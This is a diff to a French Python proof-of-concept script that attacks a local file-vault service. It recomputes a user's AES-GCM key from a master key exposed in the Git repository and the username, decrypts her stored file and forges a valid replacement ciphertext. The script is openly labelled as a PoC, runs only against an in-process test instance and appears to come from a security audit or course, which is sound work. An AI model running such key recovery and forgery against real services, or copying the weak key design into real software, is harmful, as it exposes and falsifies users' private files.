@@ -1,30 +1,61 @@
+"""PoC F2 : recalcul de la cle de chiffrement d'un utilisateur a partir du code source.
+
+Lancement (depuis la racine coffre_fichiers/) :   python3 poc/f2.py
+"""
+import io
+import os
 import sys
+import hashlib
 from pathlib import Path
 
+from cryptography.exceptions import InvalidTag
+from cryptography.hazmat.primitives.ciphers.aead import AESGCM
+
 ROOT_DIR = Path(__file__).resolve().parent.parent
-sys.path.append(str(ROOT_DIR))
+sys.path.insert(0, str(ROOT_DIR))
+from app.app import app, STORAGE  # instance locale du service (meme processus)
 
-from app.config import MASTER_KEY
-from app.crypto_utils import derive_user_key,decrypt_bytes
+# Ce que l'attaquant lit dans le depot Git (aucun import de app.crypto_utils) :
+#   app/config.py, ligne 10       -> valeur de MASTER_KEY
+#   app/crypto_utils.py, ligne 13 -> formule SHA256(MASTER_KEY + username)
+MASTER_KEY_GIT = bytes.fromhex("6b1f0c3e9a7d4e2f8c5b1a0d3e6f9c2b")
 
-def exploit_f2(target_username: str,ciphertext_blob: bytes) -> bytes:
-    """
-    Recalcule la cle de chiffrement de la victime a partir de MASTER_KEY
-    et de son nom d’utilisateur, puis dechiffre le fichier cible.
-    """
-    # 1. Calcul deterministe de la cle symetrique de la victime
-    stolen_key = derive_user_key(target_username)
-    
-    # 2. Dechiffrement direct du fichier vole dans STORAGE
-    plaintext = decrypt_bytes(ciphertext_blob, stolen_key)
-    
-    return plaintext
 
-if __name__ == "__main__":
-    target_user = "alice"
-    calculated_key = derive_user_key(target_user)
-    
-    print(f"[+] Secret maitre recupere (config.py) : {MASTER_KEY}")
-    print(f"[+] Cle calculee pour l’utilisateur ’{target_user}’ : {calculated_key.hex()}")
-    print("[+] L’attaquant peut dechiffrer tous les fichiers de STORAGE associes a cet utilisateur.")
+def cle_utilisateur(username: str) -> bytes:
+    return hashlib.sha256(MASTER_KEY_GIT + username.encode()).digest()
 
+
+client = app.test_client()
+
+# 1. Victime : alice cree son compte et depose un fichier (endpoints normaux)
+client.post("/register", json={"username": "alice", "password": "motdepasse-alice"})
+token = client.post("/login", json={"username": "alice", "password": "motdepasse-alice"}).get_json()["token"]
+auth = {"Authorization": f"Bearer {token}"}
+contenu = (ROOT_DIR / "exemples" / "rapport.txt").read_bytes()
+r = client.post("/upload", headers=auth, content_type="multipart/form-data",
+                data={"file": (io.BytesIO(contenu), "rapport.txt")})
+file_id = r.get_json()["file_id"]
+print(f"[victime] alice a depose {file_id}")
+
+# 2. Attaquant : lecture de STORAGE (simule l'acces aux sauvegardes)
+entree = STORAGE[file_id]
+blob, victime = entree["blob"], entree["owner"]
+print(f"[attaquant] blob vole : {blob.hex()[:48]}... (proprietaire : {victime})")
+
+# 3. Recalcul de la cle et dechiffrement hors ligne
+cle = cle_utilisateur(victime)
+print(f"[attaquant] cle recalculee pour {victime} : {cle.hex()}")
+try:
+    clair = AESGCM(cle).decrypt(blob[:12], blob[12:], None)
+except InvalidTag:
+    sys.exit("[-] Echec : la cle recalculee est fausse (service corrige).")
+assert clair == contenu
+print("[+] Objectif 1 casse, contenu dechiffre :", clair.decode())
+
+# 4. Falsification : l'attaquant ecrit dans STORAGE un contenu valide
+faux = b"Rapport modifie par l'attaquant."
+nonce = os.urandom(12)
+STORAGE[file_id]["blob"] = nonce + AESGCM(cle).encrypt(nonce, faux, None)
+recu = client.get(f"/download/{file_id}", headers=auth).data
+assert recu == faux
+print("[+] Objectif 2 casse, alice telecharge sans erreur :", recu.decode())
